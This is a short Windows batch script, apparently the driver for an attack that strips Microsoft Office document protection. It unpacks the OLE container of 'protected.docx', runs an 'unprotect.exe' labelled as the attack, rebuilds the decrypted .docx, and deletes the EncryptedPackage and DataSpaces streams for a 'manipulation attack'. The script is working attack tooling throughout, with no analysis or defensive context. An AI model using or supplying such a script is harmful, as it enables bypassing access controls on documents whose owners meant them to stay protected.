:: Extract OLE compound file
"C:\Program Files\7-Zip\7z.exe" x -y protected.docx -ounprotected\

:: Run the attack
CD unprotected
unprotect.exe

:: Repaire zip structure
MKDIR decrypted
"C:\Program Files\7-Zip\7z.exe" x -y decrypted.docx -odecrypted\
DEL decrypted.docx
CD decrypted
"C:\Program Files\7-Zip\7z.exe" a -y decrypted.zip *
REN decrypted.zip decrypted.docx
MOVE decrypted.docx ../../unprotected.docx

:: Clean uP
cd ../../
RMDIR /Q /S "unprotected\decrypted"
DEL /Q "unprotected\[5]DocumentSummaryInformation"
DEL /Q "unprotected\[5]SummaryInformation"
DEL /Q "unprotected\EncryptedPackage"

:: Move some files for the manipulation attack
MOVE "unprotected\[6]DataSpaces" protected\
start "" "C:\Program Files\Microsoft Office\Office15\WINWORD.EXE" unprotected.docx
